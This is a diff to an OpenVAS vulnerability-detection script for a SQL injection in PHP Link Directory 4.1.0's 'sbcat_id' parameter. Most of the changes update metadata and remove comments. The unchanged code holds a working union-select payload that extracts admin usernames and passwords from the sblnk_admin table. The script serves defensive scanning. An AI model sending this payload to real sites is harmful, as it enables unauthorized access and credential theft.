@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_php_link_directory_sql_inj_vuln.nasl 7024 2017-08-30 11:51:43Z teissa $
+# $Id: gb_php_link_directory_sql_inj_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
 #
 # PHP Link Directory Software 'sbcat_id' Parameter SQL Injection Vulnerability
 #
@@ -27,8 +27,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.801836");
-  script_version("$Revision: 7024 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-08-30 13:51:43 +0200 (Wed, 30 Aug 2017) $");
+  script_version("$Revision: 11997 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
   script_tag(name:"creation_date", value:"2011-02-07 15:21:16 +0100 (Mon, 07 Feb 2011)");
   script_bugtraq_id(46048);
   script_tag(name:"cvss_base", value:"7.5");
@@ -44,17 +44,14 @@ if(description)
   script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16061/");
 
   script_tag(name:"impact", value:"Successful exploitation will allow attacker to cause SQL
-  Injection attack and gain sensitive information.
-
-  Impact Level: Application");
+  Injection attack and gain sensitive information.");
   script_tag(name:"affected", value:"PHP link Directory software 4.1.0 and prior.");
   script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input
   via the 'sbcat_id' parameter in showcats.php, which allows attacker to
   manipulate SQL queries by injecting arbitrary SQL code.");
-  script_tag(name:"solution", value:"No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
   script_tag(name:"summary", value:"The host is running PHP Link Directory Software and is prone to
   SQL injection vulnerability.");
 
@@ -68,22 +65,17 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Get HTTP Port
 port = get_http_port( default:80 );
 
-## Check Host Supports PHP
 if( ! can_host_php( port:port ) ) exit( 0 );
 
 foreach dir( make_list_unique( "/directory", "/", cgi_dirs( port:port ) ) ) {
 
   if( dir == "/" ) dir = "";
 
-  ## Send and Receive the response
   res = http_get_cache( item: dir + "/index.php", port:port );
 
-  ## Confirm the application
   if( '>PHP link Directory software' >< res ) {
-    ## Try SQL injection and check the response to confirm vulnerability
     url = dir + "/showcats.php?sbcat_id=-9999+union+all+select+1,concat(0x4f70" +
           "656e564153,0x3a,username,0x3a,password,0x3a,0x4f70656e564153),3,4+" +
           "from+sblnk_admin--";
